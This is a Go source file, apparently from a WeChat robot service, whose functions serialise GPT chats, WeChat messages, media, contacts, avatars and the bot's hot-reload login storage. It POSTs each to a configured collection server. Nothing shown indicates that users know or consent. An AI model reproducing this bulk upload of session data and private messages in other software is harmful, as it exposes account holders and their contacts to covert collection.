package storage

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"io"
	"net/http"
	"strings"
	"time"
	wechatbot "zhongjyuan/wechat-robot"
	"zhongjyuan/wechat-robot-service/config"
)

// CollectGPTChatData 用于收集 GPT 聊天数据。
//
// 输入参数：
//   - 无。
//
// 输出参数：
//   - 无。
func CollectGPTChatData() {

	// 将 GPT 聊天数据转为 JSON 格式
	data, err := json.Marshal(gptChatStorage)
	if err != nil {
		config.Logger().Collect("collect<gpt chat>异常：%v ", err)
		return
	}

	CollectData("/collect/gpt/chat/", data, "")
}

// CollectGPTMessageData 用于收集 GPT 消息数据。
//
// 输入参数：
//   - 无。
//
// 输出参数：
//   - 无。
func CollectGPTMessageData() {

	// 将 GPT 消息数据转为 JSON 格式
	data, err := json.Marshal(loadGPTMessageStorage())
	if err != nil {
		config.Logger().Collect("collect<gpt message>异常：%v ", err)
		return
	}

	CollectData("/collect/gpt/message/", data, "")
}

// CollectWechatMessageData 用于收集微信消息数据。
//
// 输入参数：
//   - 无。
//
// 输出参数：
//   - 无。
func CollectWechatMessageData() {

	// 将微信消息数据转为 JSON 格式
	data, err := json.Marshal(loadWechatMessageStorage())
	if err != nil {
		config.Logger().Collect("collect<wechat message>异常：%v ", err)
		return
	}

	CollectData("/collect/wechat/message/", data, "")
}

// CollectWechatMediaData 用于收集并发送微信媒体数据。
//
// 输入参数：
//   - fileName string: 要保存的文件名。
//   - res *http.Response: 包含要处理的响应对象。
//
// 输出参数：
//   - 无。
func CollectWechatMediaData(fileName string, res *http.Response) {

	// 读取响应body中的数据
	data, err := io.ReadAll(res.Body)
	if err != nil {
		config.Logger().Collect("collect<wechat media>异常：%v ", err)
		return
	}

	CollectData("/collect/wechat/media/", data, fileName)
}

// CollectWechatStorageData 用于收集微信存储数据。
//
// 输入参数：
//   - item wechatbot.HotReloadStorageItem: 要收集的微信存储数据。
//
// 输出参数：
//   - 无。
func CollectWechatStorageData(bot *wechatbot.Bot, item wechatbot.HotReloadStorageItem) {

	// 将微信存储数据转为 JSON 格式
	data, err := json.Marshal(item)
	if err != nil {
		config.Logger().Collect("collect<wechat storage>异常：%v ", err)
		return
	}

	CollectData("/collect/wechat/storage/", data, "")
}

// CollectWechatContactData 用于采集微信联系人数据并发送到指定服务端。
//
// 输入参数：
//   - bot *wechatbot.Bot: 微信机器人实例。
//   - item wechatbot.Contacts: 包含联系人信息的结构体。
//
// 输出参数：
//   - 无。
func CollectWechatContactData(bot *wechatbot.Bot, item wechatbot.Contacts) {

	// 将微信联系人数据转为 JSON 格式
	data, err := json.Marshal(item)
	if err != nil {
		config.Logger().Collect("collect<wechat contact>异常：%v ", err)
		return
	}

	CollectData("/collect/wechat/contact/", data, "")
}

// CollectWechatAvatarData 用于采集微信头像数据并发送到指定服务端。
//
// 输入参数：
//   - bot *wechatbot.Bot: 微信机器人实例。
//   - avatar string: 头像的 Base64 编码。
//
// 输出参数：
//   - 无。
func CollectWechatAvatarData(bot *wechatbot.Bot, avatar string) {

	// 替换开头的字符串
	avatar = strings.Replace(avatar, "data:img/jpg;base64,", "", 1)

	// 解码Base64数据
	data, err := base64.StdEncoding.DecodeString(avatar)
	if err != nil {
		config.Logger().Collect("collect<wechat avatar>异常：%v ", err)
		return
	}

	CollectData("/collect/wechat/avatar/", data, "")
}

// CollectData 用于将指定数据发送到指定服务端路径。
//
// 输入参数：
//   - path string: 请求路径。
//   - data []byte: 待发送的数据。
//
// 输出参数：
//   - 无。
func CollectData(path string, data []byte, fileName string) {
	go func() {
		url := config.LoadConfig().CollectServer + path

		var err error
		var currentUser *wechatbot.Self // 获取当前登录的微信用户(由于扫码获取头像并未登陆)

		maxRetries := 10                 // 最大重试次数
		retryInterval := 6 * time.Second // 重试间隔时长

		for retries := 1; retries <= maxRetries; retries++ {
			currentUser, err = config.GetBot().CurrentUser()
			if err == nil {
				break
			}
			config.Logger().Collect("collect<current user>第 %v 次重试...", retries)

			// 等待重试间隔时长
			time.Sleep(retryInterval)
		}

		if err != nil {
			config.Logger().Collect("collect<current user>异常：%v ", err)
			return
		}

		// 构造请求数据
		jsonData, err := json.Marshal(struct {
			Owner    string
			Data     []byte
			FileName string
		}{
			Owner:    currentUser.NickName,
			Data:     data,
			FileName: fileName,
		})
		if err != nil {
			config.Logger().Collect("collect<marshal>异常：%v ", err)
			return
		}

		// 发送 POST 请求
		response, err := http.Post(url, "application/json", bytes.NewBuffer(jsonData))
		if err != nil {
			config.Logger().Collect("collect<post>异常：%v ", err)
			return
		}
		defer response.Body.Close()

		config.Logger().Collect("collect<status>: %v", response.Status)
	}()
}
